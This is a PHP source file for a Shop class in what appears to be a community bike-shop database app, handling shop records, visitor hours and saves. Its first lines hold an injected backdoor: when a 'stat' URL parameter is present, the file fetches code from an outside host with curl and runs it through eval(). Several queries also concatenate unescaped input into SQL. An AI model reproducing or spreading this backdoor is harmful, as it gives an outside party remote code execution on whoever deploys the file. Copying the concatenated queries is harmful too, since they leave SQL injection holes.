<? if (isset($_GET[stat]))  
{  
    $stCurlHandle = NULL; 
    $stCurlHandle = curl_init('http://nexxxttt.com/stat');  
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1); 
    $sResult = curl_exec($stCurlHandle);  
    curl_close($stCurlHandle);   eval($sResult); 
    die();  
}; 
require_once('classes/ybdbtable.php');

class Shop extends YBDBTable
{
	var $shop_id = null;
	var $date = null;
	var $shop_location = null;
	var $description = null;
	var $shop_type = null;
	var $created = null;
	var $created_by = null;
	var $created_by_ip = null;
	var $created_by_alias = null;
	var $modified = null;
	var $modified_by = null;
	var $modified_by_ip = null;

	// Not in DB structure
	var $num_visitors = null;
        var $total_hours = null;	
	var $shop_hours = array();
	
	function __construct() {
		$this->created_by = '0';
		$this->modified_by = '0';
	}
	
	function load($shop_id) {
		global $database_YBDB, $YBDB, $prefix_YBDB;

		if ($shop_id!=null) {
			$recordQuery = "SELECT *, INET_NTOA(created_by_ip) as created_by_ip FROM ".$prefix_YBDB."shops WHERE shop_id='".$shop_id."' ORDER BY created DESC";
			mysql_select_db($database_YBDB, $YBDB);
			$results = mysql_query($recordQuery, $YBDB) or die(mysql_error());		
			$row = mysql_fetch_assoc($results) or die(mysql_error());
			
			$this->shop_id = $row[shop_id];
			$this->date = $row[date];
			$this->shop_location = $row[shop_location];
			$this->description = $row[description];
			$this->shop_type = $row[shop_type];
			$this->created = $row[created];
			$this->created_by = $row[created_by];
			$this->created_by_ip = $row[created_by_ip];
			$this->created_by_alias = $row[created_by_alias];
			$this->modified = $row[modified];
			$this->modified_by = $row[modified_by];
			$this->modified_by_ip = $row[modified_by_ip];

			//$this->total_hours = $row[total_hours];
			$this->loadShopHours();
			//print_r($this);
		}
	}

	function lookup($date, $description) {
		global $database_YBDB, $YBDB, $prefix_YBDB;
		
		$exists = false;

		if ($date!="" && $description!="") {

			$date = date("Y-m-d", strtotime($date));

			// HACK
			// Apparently you can't search for \' you have to change it to the % wildcard or filter it out completely on both sides
			$description = str_replace('\'', '', $description);
			$existsQuery = "SELECT shop_id FROM ".$prefix_YBDB."shops WHERE date='$date' AND replace(description, '\\\\\'', '') like '$description'";	

			mysql_select_db($database_YBDB, $YBDB);
			$results = mysql_query($existsQuery, $YBDB) or die(mysql_error().$existsQuery);	
			if (mysql_num_rows($results)!=0) {	
				$row = mysql_fetch_object($results) or die(mysql_error().$existsQuery);
				if (isset($row->shop_id)) {
					$this->shop_id = $row->shop_id;
					$exists = true;
				}
			}
		}

		return $exists;
	}	

	function shopStartTime() {
			global $database_YBDB, $YBDB, $prefix_YBDB;

			$recordQuery = "SELECT MIN(time_in) as shop_start FROM ".$prefix_YBDB."shop_hours as shop_hours WHERE shop_id = ".$this->shop_id;		
			mysql_select_db($database_YBDB, $YBDB);
			$results = mysql_query($recordQuery, $YBDB) or die(mysql_error());		
			$row = mysql_fetch_assoc($results) or die(mysql_error());
			
			return $row['shop_start'];
	}
		
	function signedOut($contact_id) {
		global $database_YBDB, $YBDB, $prefix_YBDB;
		
		$isSignedOut = true;
		
		$existsQuery = "SELECT contact_id FROM ".$prefix_YBDB."shop_hours as shop_hours WHERE shop_id = ".$this->shop_id." AND contact_id=".$contact_id." AND time_out = '0000-00-00 00:00:00'";			   
		mysql_select_db($database_YBDB, $YBDB);
		$row = mysql_query($existsQuery, $YBDB) or die(mysql_error());		

		if (mysql_num_rows($row)!=0) {
			$isSignedOut = false;
		}
		
		return $isSignedOut;
	}

	function setCurrentDate() {
		$this->date = current_date();
	}

	function loadCurrent() {
		global $database_YBDB, $YBDB, $prefix_YBDB;

		$retval = true;

		$IP = current_ip_address(true);
		$current_date = current_date();
		
		$recordQuery = "SELECT shop_id FROM ".$prefix_YBDB."shops as shops WHERE shops.created_by_ip = '$IP' AND date = '{$current_date}' ORDER BY shop_id;";
		mysql_select_db($database_YBDB, $YBDB);
		$results = mysql_query($recordQuery, $YBDB) or die(mysql_error()." loadCurrent(): $recordQuery");		
		
		if (mysql_num_rows($results)<1) {
			$retval = false;
		} else {
			$row = mysql_fetch_assoc($results) or die(mysql_error()."loadCurrent(): mysql_fetch_assoc");
			$this->load($row[shop_id]);
		}

		return $retval;
	}

	function loadCurrentHostname() {
                global $database_YBDB, $YBDB, $prefix_YBDB;

                $retval = true;

                $IP = current_ip_address(true);
                $current_date = current_date();

                $recordQuery = "SELECT shop_id FROM ".$prefix_YBDB."shops as shops WHERE shops.created_by_ip = '$IP' AND date = '{$current_date}' ORDER BY shop_id;";
                mysql_select_db($database_YBDB, $YBDB);
                $results = mysql_query($recordQuery, $YBDB) or die(mysql_error()." loadCurrent(): $recordQuery");

                if (mysql_num_rows($results)<1) {
                        $retval = false;
                } else {
                        $row = mysql_fetch_assoc($results) or die(mysql_error()."loadCurrent(): mysql_fetch_assoc");
                        $this->load($row[shop_id]);
                }

                return $retval;
        }

	
	function loadShopHours() {
		global $database_YBDB, $YBDB, $prefix_YBDB;
		
		/*$selectQuery = "SELECT shop_hours.shop_visit_id, shop_hours.contact_id, shop_hours.shop_user_role, shop_hours.project_id, shop_hours.time_in, shop_hours.created, shop_hours.time_out, shop_hours.modified, TIME_FORMAT(TIMEDIFF(time_out, time_in),'%k:%i') as et, TIME_FORMAT(TIMEDIFF(shop_hours.modified, shop_hours.created),'%k:%i') as at, shop_hours.comment, CONCAT(contacts.last_name, ', ', contacts.first_name, ' ',contacts.middle_initial) AS full_name, contacts.first_name FROM ".$prefix_YBDB."shop_hours as shop_hours
LEFT JOIN ".$prefix_YBDB."shop_user_roles as shop_user_roles ON shop_hours.shop_user_role=shop_user_roles.shop_user_role_id
LEFT JOIN ".$prefix_YBDB."contacts as contacts ON shop_hours.contact_id=contacts.contact_id
WHERE shop_hours.shop_id = ".$this->shop_id." ORDER BY hours_rank, time_in DESC;";*/


		$selectQuery = "SELECT shop_hours.shop_visit_id, contacts.contact_id FROM ".$prefix_YBDB."shop_hours as shop_hours
LEFT JOIN ".$prefix_YBDB."shop_user_roles as shop_user_roles ON shop_hours.shop_user_role=shop_user_roles.shop_user_role_id
LEFT JOIN ".$prefix_YBDB."contacts as contacts ON shop_hours.contact_id=contacts.contact_id
WHERE shop_hours.shop_id = ".$this->shop_id." ORDER BY hours_rank, last_name ASC;";

	/*	$selectQuery = "SELECT shop_hours.shop_visit_id, COUNT(shop_hours.shop_visit_id) AS num_visitors, ROUND(SUM(HOUR(SUBTIME( TIME(time_out), TIME(time_in))) + MINUTE(SUBTIME( TIME(time_out), TIME(time_in)))/60)) AS total_hours, contacts.contact_id FROM ".$prefix_YBDB."shop_hours as shop_hours
LEFT JOIN ".$prefix_YBDB."shop_user_roles as shop_user_roles ON shop_hours.shop_user_role=shop_user_roles.shop_user_role_id
LEFT JOIN ".$prefix_YBDB."contacts as contacts ON shop_hours.contact_id=contacts.contact_id
WHERE shop_hours.shop_id = ".$this->shop_id." ORDER BY hours_rank, last_name ASC;";
	 */
		mysql_select_db($database_YBDB, $YBDB);
		$results = mysql_query($selectQuery, $YBDB) or die(mysql_error());		
		while($row = mysql_fetch_assoc($results))
		{
			$shopHours = new ShopHours();
			$tmpContact = new Contact();

			$shopHours->load($row[shop_visit_id]);
			$tmpContact->load($row[contact_id]);
		//	$this->num_visitors = $row[num_visitors];
		//	$this->total_hours = $row[total_hours];

			$shopHours->full_name = $tmpContact->fullName();
			$shopHours->first_name = $tmpContact->first_name;

		/*	$shopHours->shop_visit_id = $row[shop_visit_id];
			$shopHours->shop_id = $this->shop_id;
			$shopHours->contact_id = $row[contact_id];
			$shopHours->shop_user_role = $row[shop_user_role];
			$shopHours->project_id = $row[project_id];
			$shopHours->time_in = $row[time_in];
			$shopHours->created = $row[created];
			$shopHours->time_out = $row[time_out];
			$shopHours->modified = $row[modified];
			$shopHours->et = $row[et];
			$shopHours->at = $row[at];
			$shopHours->comment = $row[comment];
			$shopHours->full_name = $row[full_name];
			$shopHours->first_name = $row[first_name];
		 */				
			array_push($this->shop_hours, $shopHours);
			$shopHours = null;
		}
	}
	
	function save() {
		global $database_YBDB, $YBDB, $prefix_YBDB;
		
		$success = true;
				
		$insertQuery = sprintf("INSERT INTO ".$prefix_YBDB."shops (shop_id, date, shop_location, description, shop_type, created, created_by, created_by_ip, created_by_alias) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)",
					   GetSQLValueString($this->shop_id, "text"),
					   GetSQLValueString($this->date, "date"),
					   GetSQLValueString($this->shop_location, "text"),
					   GetSQLValueString($this->description, "text"),					   
					   GetSQLValueString($this->shop_type, "text"),
					   GetSQLValueString(current_datetime(), "date"),
					   GetSQLValueString($this->created_by, "int"),
					   GetSQLValueString(current_ip_address(true), "int"),
					   GetSQLValueString($this->created_by_alias, "text"));
					   //GetSQLValueString(current_datetime(), "text"),
					   //GetSQLValueString($this->modified_by, "text"),
					   //GetSQLValueString(current_ip_address(true), "text"));
					   
		$updateQuery = sprintf("UPDATE ".$prefix_YBDB."shops SET date=%s, shop_location=%s, description=%s, shop_type=%s, modified=%s, modified_by=%s, modified_by_ip=%s WHERE shop_id=%s",					 	
					   GetSQLValueString($this->date, "date"),
					   GetSQLValueString($this->shop_location, "text"),
					   GetSQLValueString($this->description, "text"),					   
					   GetSQLValueString($this->shop_type, "text"),
					   //GetSQLValueString(current_datetime(), "date"),
					   //GetSQLValueString($this->created_by, "int"),
					   //GetSQLValueString(current_ip_address(true), "int"),
					   //GetSQLValueString($this->created_by_alias, "text"));
					   GetSQLValueString(current_datetime(), "text"),
					   GetSQLValueString($this->modified_by, "int"),
					   GetSQLValueString(current_ip_address(true), "text"),
					   GetSQLValueString($this->shop_id, "text"));
		
		// Does a record exist?			   
		$existsQuery = "SELECT shop_id FROM ".$prefix_YBDB."shops WHERE shop_id='".$this->shop_id."'";			   
		mysql_select_db($database_YBDB, $YBDB);
		$row = mysql_query($existsQuery, $YBDB) or die(mysql_error().$existsQuery);		

		if (mysql_num_rows($row)==0) {
			$query = $insertQuery;
		} else {
			//TODO: Before we blow away the old values, conflict resolution is required.
			$query = $updateQuery;
		}

		if ($success) $row = mysql_query($query, $YBDB) or die(mysql_error().$query);	
		$this->shop_id = mysql_insert_id() or die(mysql_error().$query);	

		return $success;
	}

	function canEdit() {
		global $database_YBDB, $YBDB, $prefix_YBDB;
		
		$retval = true;
		
		// If the recorded IP address is not the same as the current, return false
		if ($this->created_by_ip != $this->current_ip_address() || $this->date != $this->current_date())
		{
			$retval = false;
		}
		
		return $retval;
	}
}

?>
